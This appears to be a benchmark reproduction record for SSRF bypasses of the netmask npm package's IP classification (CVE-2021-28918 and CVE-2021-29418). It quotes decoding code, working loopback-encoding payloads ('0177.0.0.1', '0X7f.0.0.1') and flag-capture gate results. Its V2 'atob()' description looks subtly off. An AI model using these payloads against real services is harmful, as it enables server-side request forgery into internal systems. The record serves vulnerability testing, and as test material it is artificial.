PatchClosure-Bench repro — netmask-octal-ssrf
Pair: CVE-2021-28918 (original; V1 = incomplete-fix TARGET) -> CVE-2021-29418 (V2 = complete fix)
Oracle variant: A (same-sink encoding bypass; flag_oracle.validate_case) + V2 negative control.
Runtime: Docker 29.4.0, node:20-slim, REAL npm `netmask` package via npm aliases.

VERSIONS (guard = block iff netmask classifies raw host inside an internal range;
          denylist = 127/8, 10/8, 172.16/12, 192.168/16, 169.254/16 — 0.0.0.0/8 intentionally omitted):
  V0 = netmask@1.0.6  (pre CVE-2021-28918)                       profile v0, http://127.0.0.1:39570
  V1 = netmask@2.0.0  (CVE-2021-28918 fix; TARGET, 29418-vuln)   profile v1, http://127.0.0.1:39571
  V2 = netmask@2.0.1  (CVE-2021-29418 complete fix; negative)    profile v2, http://127.0.0.1:39572

CANARY: loopback flag sidecar bound 127.0.0.1:80 INSIDE each harness container (no host port).
  Seed and residual both route (via undici at connect time) to loopback 127.0.0.1, so the canary is
  loopback (not a docker-net IP). Host is read RAW from the ?host= query param and fed to netmask
  un-normalised (no new URL / no legacy url.parse — those would canonicalise/lower-case the encoding).

ip2long / octet-decode EVOLUTION (verbatim, lib/netmask.js):
  V0 netmask@1.0.6 — ignores leading zeros; octet used as raw string in the shift expression:
    b = (ip + '').split('.');
    ... validate parseInt(byte,10) not NaN and 0<=byte<=255 ...
    return ((b[0]||0)<<24 | (b[1]||0)<<16 | (b[2]||0)<<8 | (b[3]||0)) >>> 0;
      => "0177" << 24 coerces via Number("0177")=177  ->  0177.0.0.1 read as 177.0.0.1.

  V1 netmask@2.0.0 — CVE-2021-28918 fix adds base detection, but with a typo in the hex test:
    if (byte && byte[0] === '0') {
      if (byte.length > 2 && (byte[1] === 'x' || byte[1] === 'x')) {   // <- typo: 'X' never matches
        byte = parseInt(byte, 16);
      } else {
        byte = parseInt(byte, 8);                                       // octal branch
      }
    } else { byte = parseInt(byte, 10); }
      => "0177" -> parseInt("0177",8)=127  (octal now correct; seed 0177.0.0.1 -> 127.0.0.1, BLOCKED)
      => "0X7f" -> hex test fails (uppercase X) -> parseInt("0X7f",8)=0  ->  0X7f.0.0.1 read as 0.0.0.1
         (0.0.0.x not in denylist -> ADMITTED)  ->  CVE-2021-29418 residual.

  V2 netmask@2.0.1 — CVE-2021-29418 complete fix: ip2long rewritten to scan char-by-char via atob(),
    which handles both 0x and 0X and rejects stray characters:
    if (s[i+1] === 'x' || s[i+1] === 'X') { i += 2; base = 16; }        // 0X now correct
      => "0X7f" -> 127  ->  0X7f.0.0.1 -> 127.0.0.1  ->  BLOCKED.

CRAFTED STRINGS:
  original / seed (CVE-2021-28918): host = 0177.0.0.1   (octal loopback)
  residual        (CVE-2021-29418): host = 0X7f.0.0.1   (UPPERCASE-hex loopback; == 0x7f.0.0.1 == 127.0.0.1)

CLASSIFICATION (real netmask pkg, guard denylist above):  ALLOW = admitted (fetch runs)
  0177.0.0.1   -> V0 ALLOW , V1 BLOCK(127/8) , V2 BLOCK(127/8)   (seed; 28918 fix closes it on V1)
  0X7f.0.0.1   -> V0 BLOCK(127/8) , V1 ALLOW , V2 BLOCK(127/8)    (residual; still admitted on patched V1 -> 29418)
ROUTING (node:20-slim undici fetch): both forms reach the 127.0.0.1 loopback sidecar (verified).

GATE (oracle.py --wait, PCB_FLAG planted per-run):
  _env_ready: {v0: true, v1: true, v2: false*}   (*v2 "not ready" via flag-probe is EXPECTED: v2
              correctly BLOCKS the residual, so no flag returns — it is the negative control.)
  original_poc_reaches_flag_on_v0 : true    # host=0177.0.0.1  admitted on V0 -> sidecar -> FLAG
  original_poc_blocked_on_v1      : true    # host=0177.0.0.1  netmask 127/8 on V1 -> blocked, no fetch
  bypass_poc_reaches_flag_on_v1   : true    # host=0X7f.0.0.1  admitted on V1 -> sidecar -> FLAG (RESIDUAL)
  passed                          : true
  residual_blocked_on_v2          : true    # host=0X7f.0.0.1  netmask 127/8 on V2 -> blocked (complete fix)

